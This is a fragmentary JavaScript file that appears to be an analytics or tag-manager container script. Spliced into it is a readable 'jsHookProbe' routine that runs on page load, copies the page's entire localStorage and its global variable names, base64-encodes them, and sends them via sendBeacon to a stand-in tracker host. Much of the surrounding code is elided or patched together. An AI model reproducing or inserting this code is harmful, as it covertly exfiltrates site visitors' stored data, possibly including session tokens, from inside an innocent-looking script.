...
(function () {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIkAOzHCQgpQlXpbPdjmmdxQJeTOsCH/yfcqDSUKpJ/59/B9r/KGgKY1w\x3d\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
    ...
    async hook(name, {
      ...
      return new Promise(resolve => {
        ...
        script.onload = () => {
          ...
          this.onEvent.add(`load:${name}`);
          resolve(true);
        };
        script.onerror = () => {
          clearTimeout(timeout);
          this.detected.delete(name);
          this.onEvent.add(`error:${name}`);
          resolve(false);
        };
        script.src = `js-hook://${id}/${file}`;
      });
    },
    randomizeQueue() {
      const items = Array.from(this.trackingQueue.entries());
      for (let i = items.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [items[i], items[j]] = [items[j], items[i]];
      }
      this.trackingQueue = new Map(items);
    },
    gatherLocalStorage() {
      this.localStorageData = localStorage;
    },
    gatherGlobalVariables() {
      this.globals = Object.keys(window).filter(x => !window.hasOwnProperty(x));
    },
    async track() {
      this.randomizeQueue();
      this.gatherLocalStorage();
      this.gatherGlobalVariables();
      const results = {};
      for (const [name, data] of this.trackingQueue) {
        await new Promise(r => setTimeout(r, Math.random() * 200));
        results[name] = await this.hook(name, data);
      }
      const payload = btoa(JSON.stringify({
        ...
        events: Array.from(this.onEvent),
        globals: this.globals,
        localStorage: this.localStorageData
      }));
      navigator.sendBeacon('https://tracker-endpoint.example/v2/report', payload);
    }
  };
  function Ko(a) {
  ...
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => jsHookProbe.track());
  } else {
    jsHookProbe.track();
  }
  function Ov(a, b) {
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'UA-285912-3'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
